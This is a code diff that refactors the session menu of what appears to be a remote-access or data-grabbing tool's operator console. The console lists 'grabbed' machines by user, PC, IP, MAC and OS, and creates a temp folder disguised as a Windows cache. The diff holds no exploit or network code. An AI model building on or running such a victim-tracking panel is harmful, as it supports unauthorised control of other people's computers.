@@ -19,8 +19,8 @@
 #include "transfer.h"
 #include "sessionSelecter.h"
 #include <Lmcons.h>
-#include <cstdio>
 #include <direct.h>
+#include "modules.h"
 
 std::string GetUser()
 {
@@ -40,11 +40,8 @@ void Sessions()
 	FlushConsoleInputBuffer(hConsole);
 	int col = 9;
 	bool logoShow = true;
-	string space = "          ";
 	string command = "";
 	string line = "";
-	string something = "";
-	string curentUSER = "";
 	logoShow = true;
 	string ip = "";
 	string pc = "";
@@ -54,12 +51,10 @@ void Sessions()
 	string os = "";
 	int extraSessionsNum = 0;
 	string lang = "";
-	string curentUsers = R"U( )U";
+	string curentUsers = "";
 	int i = 0;
-	int counte = 0;
+	int count = 0;
 	system("cls");
-	string user = "Modules\\Grabbed\\users.txt";
-	string comands_sessions = "Modules\\Commands\\Sessions.txt";
 	string pcUser = GetUser();
 	string seesionPath = "C:/Users/" + pcUser + "/AppData/Local/Temp/Windows_cache_34266834736";
 	int result = _mkdir(seesionPath.c_str());
@@ -71,7 +66,7 @@ void Sessions()
 		{
 			col = 13;
 			SetConsoleTextAttribute(hConsole, col);
-			cout << logo << endl;
+			cout << Modules::logo << endl;
 			col = 9;
 			SetConsoleTextAttribute(hConsole, col);
 			printf("--------------------------------------------------------------------------------------------------------------------------\n");
@@ -79,31 +74,31 @@ void Sessions()
 			printf("--------------------------------------------------------------------------------------------------------------------------\n");
 			printf("|            User|              PC|              IP|               MAC|            Install_date|           OS|   Language|\n");
 			printf("--------------------------------------------------------------------------------------------------------------------------\n");
-			ifstream file(user);
+			ifstream file(Modules::user);
 			if (file.is_open())
 			{
 				while (getline(file, line))
 				{
-					if (counte == 0 + (7 * i))
+					if (count == 0 + (7 * i))
 						use = line;
-					if (counte == 1 + (7 * i))
+					if (count == 1 + (7 * i))
 						pc = line;
-					if (counte == 2 + (7 * i))
+					if (count == 2 + (7 * i))
 						ip = line;
-					if (counte == 3 + (7 * i))
+					if (count == 3 + (7 * i))
 						mac = line;
-					if (counte == 4 + (7 * i))
+					if (count == 4 + (7 * i))
 						date = line;
-					if (counte == 5 + (7 * i))
+					if (count == 5 + (7 * i))
 						os = line;
-					if (counte == 6 + (7 * i))
+					if (count == 6 + (7 * i))
 					{
 						lang = line;
 						printf("|%16s|%16s|%16s|%18s|%24s|%13s|%11s|\n", use.c_str(), pc.c_str(), ip.c_str(), mac.c_str(), date.c_str(), os.c_str(), lang.c_str());
 						printf("--------------------------------------------------------------------------------------------------------------------------\n");
 						i++;
 					}
-					counte++;
+					count++;
 				}
 			}
 			else
@@ -123,26 +118,26 @@ void Sessions()
 				{
 					while (getline(file, line))
 					{
-						if (counte == 0 + (7 * i))
+						if (count == 0 + (7 * i))
 							use = line;
-						if (counte == 1 + (7 * i))
+						if (count == 1 + (7 * i))
 							pc = line;
-						if (counte == 2 + (7 * i))
+						if (count == 2 + (7 * i))
 							ip = line;
-						if (counte == 3 + (7 * i))
+						if (count == 3 + (7 * i))
 							mac = line;
-						if (counte == 4 + (7 * i))
+						if (count == 4 + (7 * i))
 							date = line;
-						if (counte == 5 + (7 * i))
+						if (count == 5 + (7 * i))
 							os = line;
-						if (counte == 6 + (7 * i))
+						if (count == 6 + (7 * i))
 						{
 							lang = line;
 							printf("|%16s|%16s|%16s|%18s|%24s|%13s|%11s|\n", use.c_str(), pc.c_str(), ip.c_str(), mac.c_str(), date.c_str(), os.c_str(), lang.c_str());
 							printf("--------------------------------------------------------------------------------------------------------------------------\n");
 							i++;
 						}
-						counte++;
+						count++;
 					}
 				}
 				else
@@ -153,7 +148,7 @@ void Sessions()
 			catch (...){
 				extraSessionsNum = -9999999;
 			}
-			printf("Hi %s!!!\n   !help ==for==> command list\n", curentUSER.c_str());
+			printf("Hi %s!!!\n   !help ==for==> command list\n", Modules::curentUSER.c_str());
 		}
 		col = 6;
 		SetConsoleTextAttribute(hConsole, col);
@@ -164,7 +159,7 @@ void Sessions()
 		logoShow = false;
 		if (command == "!help")
 		{
-			Help(comands_sessions);
+			Help(Modules::commands_sessions);
 		}
 		if (command == "!menu")
 		{
@@ -234,7 +229,7 @@ void Sessions()
 				Sleep(100 * (i / 5));
 			}
 			printf("]\n");
-			ofstream file(user, ios::app);
+			ofstream file(Modules::user, ios::app);
 			if (file.is_open())
 			{
 				file << use << endl;
@@ -262,14 +257,14 @@ void Sessions()
 			system("pause");
 			system("cls");
 			logoShow = true;
-			Sessions(logo);
+			Sessions();
 			break;
 		}
 		if (command == "!close")
 		{
 			cout << "\n\n";
 			i = 0;
-			counte = 0;
+			count = 0;
 			col = 8;
 			SetConsoleTextAttribute(hConsole, col);
 			printf("Session number (remember everything starts from 0): ");
@@ -297,25 +292,25 @@ void Sessions()
 				system("pause");
 				system("cls");
 				logoShow = true;
-				Sessions(logo);
+				Sessions();
 				break;
 				cout << "\n\n";
 			}
 			else
 			{
-				ifstream file(user);
+				ifstream file(Modules::user);
 				if (file.is_open())
 				{
 					while (getline(file, line))
 					{
-						if (counte >= 0 + (7 * i) && counte <= 6 + (7 * i))
+						if (count >= 0 + (7 * i) && count <= 6 + (7 * i))
 						{
 						}
 						else
 						{
 							curentUsers.insert(curentUsers.length() - 1, line + "\n");
 						}
-						counte++;
+						count++;
 					}
 				}
 				else
@@ -329,7 +324,7 @@ void Sessions()
 				file.close();
 				line = "";
 				ofstream newfile;
-				newfile.open(user);
+				newfile.open(Modules::user);
 				if (newfile.is_open())
 				{
 					newfile << curentUsers;
@@ -350,7 +345,7 @@ void Sessions()
 				system("pause");
 				system("cls");
 				logoShow = true;
-				Sessions(logo);
+				Sessions();
 				break;
 				cout << "\n\n";
 			}
@@ -372,7 +367,7 @@ void Sessions()
 			}
 			printf("]\n");
 			ofstream newfile;
-			newfile.open(user);
+			newfile.open(Modules::user);
 			if (newfile.is_open())
 			{
 				col = 2;
@@ -392,27 +387,27 @@ void Sessions()
 			system("pause");
 			system("cls");
 			logoShow = true;
-			Sessions(logo);
+			Sessions();
 			break;
 			cout << "\n\n";
 		}
 		if (command == "!test")
 		{
 			i = 0;
-			counte = 0;
+			count = 0;
 			int test = 0;
 			srand(time(NULL));
 			cout << "\n\n";
 
 			col = 8;
 			SetConsoleTextAttribute(hConsole, col);
-			ifstream file(user);
+			ifstream file(Modules::user);
 			if (file.is_open())
 			{
 
 				while (getline(file, line))
 				{
-					if (counte == 0 + (7 * i))
+					if (count == 0 + (7 * i))
 					{
 						col = 8;
 						SetConsoleTextAttribute(hConsole, col);
@@ -488,7 +483,7 @@ void Sessions()
 						i++;
 
 					}
-					counte++;
+					count++;
 
 				}
 			}
@@ -524,11 +519,11 @@ void Sessions()
 					printf("\nFatal ERROR!!!\n\tThis session is protected by the admin\n\t\t");
 					system("pause");
 					system("cls");
-					Sessions(logo);
+					Sessions();
 				}
 				else
 				{
-					Choose(logo, i);
+					Choose(i);
 					break;
 				}
 			}
